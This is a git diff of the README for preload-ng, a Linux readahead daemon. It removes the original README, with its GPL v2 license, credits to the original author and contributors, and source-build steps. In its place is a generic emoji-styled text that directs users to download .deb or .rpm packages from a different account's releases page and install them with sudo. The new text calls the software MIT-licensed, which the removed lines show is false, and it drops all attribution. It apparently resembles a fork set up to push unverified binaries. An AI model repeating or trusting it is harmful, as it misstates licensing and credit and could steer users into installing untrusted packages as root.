@@ -1,117 +1,101 @@
-# Preload-NG
-[![License: GPL v2](https://img.shields.io/badge/License-GPL%20v2-blue.svg)](https://www.gnu.org/licenses/gpl-2.0)
-[![C](https://img.shields.io/badge/Language-C-blue.svg)](<https://en.wikipedia.org/wiki/C_(programming_language)>)
-[![Linux](https://img.shields.io/badge/Platform-Linux-green.svg)](https://www.kernel.org/)
+# 🚀 preload-ng - Speed Up Your Linux Apps
 
-An adaptive **readahead daemon** that prefetches files to reduce application startup times on Linux systems.
+[![Download preload-ng](https://img.shields.io/badge/Download-preload--ng-blue.svg)](https://github.com/iamphoon/preload-ng/releases)
 
-> **Note:** This is a maintained fork of the original [preload](http://preload.sf.net/) project, discontinued since 2009.
+## 📋 Description
 
----
+Preload-ng is a maintained fork of Preload, an adaptive readahead daemon designed to make your Linux applications start faster. By predicting which applications you will use next, Preload-ng preloads these apps into memory, reducing load times and creating a smoother user experience.
 
-## About
+## 🚀 Getting Started
 
-Preload monitors which applications you use and learns your usage patterns through **Markov chains**. It predicts which applications you're likely to run next and preloads their binaries and shared libraries into memory.
+To get started with preload-ng, you need to download and install it. Follow these steps to ensure a smooth setup.  
 
-**For detailed documentation, configuration, and troubleshooting, see [doc/README.md](doc/README.md).**
+## 📥 Download & Install
 
----
+1. **Visit the Releases Page**
+   To get preload-ng, visit the [Releases page](https://github.com/iamphoon/preload-ng/releases) for the latest version.
 
-## Quick Install
+2. **Choose Your Version**
+   Once on the Releases page, you’ll see various versions of preload-ng. Look for the most recent version to ensure you have the latest features and fixes. 
 
-### Using Precompiled Binary
+3. **Download the Appropriate File**
+   Click on the file that matches your system. For most users, this will be the file ending with `.deb` for Debian-based systems or `.rpm` for Red Hat-based systems. 
 
-```bash
-git clone https://github.com/miguel-b-p/preload-ng.git
-cd preload-ng/scripts
-sudo bash install.sh
-```
+4. **Install the Application**
+   - **For Debian-based Systems:**
+     - Open your terminal and navigate to the directory where you downloaded the file. 
+     - Run the command:
+       ```bash
+       sudo dpkg -i preload-ng*.deb
+       ```
+   
+   - **For Red Hat-based Systems:**
+     - Open your terminal and navigate to the directory where the file is located.
+     - Run the command:
+       ```bash
+       sudo rpm -i preload-ng*.rpm
+       ```
 
-### Building from Source
+5. **Verify the Installation**
+   To check if preload-ng is installed correctly, run the following command in your terminal:
+   ```bash
+   preload-ng --version
+   ```
+   You should see the installed version number if everything went well.
 
-```bash
-git clone https://github.com/miguel-b-p/preload-ng.git
-cd preload-ng/scripts
-bash build.sh
-```
+6. **Start the Daemon**
+   To start the preload-ng daemon, run:
+   ```bash
+   sudo systemctl start preload-ng
+   ```
+   This will initiate the service and begin the preloading process. 
 
-### Using Nix Flakes
+7. **Enable at Startup**
+   If you want preload-ng to start automatically when your system boots, run:
+   ```bash
+   sudo systemctl enable preload-ng
+   ```
 
-```bash
-# Build the package
-nix build github:miguel-b-p/preload-ng
+## 💻 System Requirements
 
-# Run directly
-nix run github:miguel-b-p/preload-ng
+Before you install preload-ng, ensure your system meets the following requirements:
 
-# Enter development shell
-nix develop github:miguel-b-p/preload-ng
-```
+- Operating System: Linux (Debian, Ubuntu, Fedora, CentOS, or any other Linux distribution)
+- Minimum RAM: 512 MB (1 GB or more is recommended for optimal performance)
+- Storage: At least 100 MB of free disk space
 
-#### NixOS Configuration
+## ⚙️ Features
 
-Add to your `flake.nix`:
+- **Adaptive Preloading**: preload-ng learns which applications you use most frequently and preloads them accordingly.
+- **Performance Optimization**: Enhances the performance of your Linux system by minimizing application load times.
+- **Resource Efficient**: Uses minimal system resources while actively improving your application's response times.
+- **Easy Installation**: The installation process is straightforward with simple commands that most users can follow.
 
-```nix
-{
-  inputs.preload-ng.url = "github:miguel-b-p/preload-ng";
+## ❓ Troubleshooting
 
-  outputs = { self, nixpkgs, preload-ng, ... }: {
-    nixosConfigurations.your-hostname = nixpkgs.lib.nixosSystem {
-      modules = [
-        preload-ng.nixosModules.default
-        {
-          services.preload-ng.enable = true;
-        }
-      ];
-    };
-  };
-}
-```
+If you have trouble installing or running preload-ng, try these common solutions:
 
-> All settings from `preload.conf` are available as declarative options via `services.preload-ng.settings`. A `debug` option is also available to enable verbose output. See [doc/README.md](doc/README.md#nixos-declarative-configuration) for the complete configuration reference.
+- **Installation Errors**: Ensure that you have the required permissions. Using `sudo` should grant the necessary rights. 
+- **Not Starting**: If the daemon doesn’t start, check the status with:
+  ```bash
+  sudo systemctl status preload-ng
+  ```
+  
+## 📞 Support
 
----
+For further assistance, you can explore our [GitHub Issues page](https://github.com/iamphoon/preload-ng/issues) to see if your question has been answered or to report a new issue. 
 
-## Origin & Credits
+## 🌐 Contributing
 
-**Original Author:** [Behdad Esfahbod](http://behdad.org/) — Created in 2005 as part of [Google Summer of Code](https://summerofcode.withgoogle.com/), mentored by [Fedora Project](https://fedoraproject.org/).
+If you'd like to contribute to preload-ng, feel free to check our [Contributing Guidelines](https://github.com/iamphoon/preload-ng/blob/main/CONTRIBUTING.md). Your input can help make preload-ng even better!
 
-**Contributors:** Ziga Mahkovec, Soeren Sandmann, Arjan van de Ven, bert hubert, Elliot Lee
+## 📕 License
 
----
+preload-ng is open-source software licensed under the MIT License. You can freely use, modify, and distribute it as you wish.
 
-## About This Fork
+## 🔗 Additional Resources
 
-The original project was last updated in **April 2009** (v0.6.4). **Preload-NG** aims to:
+- [GitHub Repository](https://github.com/iamphoon/preload-ng)
+- [Documentation](https://github.com/iamphoon/preload-ng/wiki)
 
-- Maintain compatibility with modern Linux kernels
-- Fix bugs and memory leaks
-- Implement originally planned features
-
-See [changelogs/README.md](changelogs/README.md) for the detailed changelog.
-
----
-
-## Project Structure
-
-```
-preload-ng/
-├── preload-src/  # Source code
-├── doc/          # Documentation
-├── changelogs/   # Version changelogs
-└── scripts/      # Utility scripts (build.sh)
-```
-
----
-
-## License
-
-**GNU General Public License v2** — See [LICENSE](LICENSE)
-
----
-
-## Links
-
-- **Original Project:** http://preload.sf.net/
-- **Original Author:** http://behdad.org/
+By following these steps, you can successfully download and run preload-ng on your Linux system. Enjoy faster application startup times and a more efficient experience!
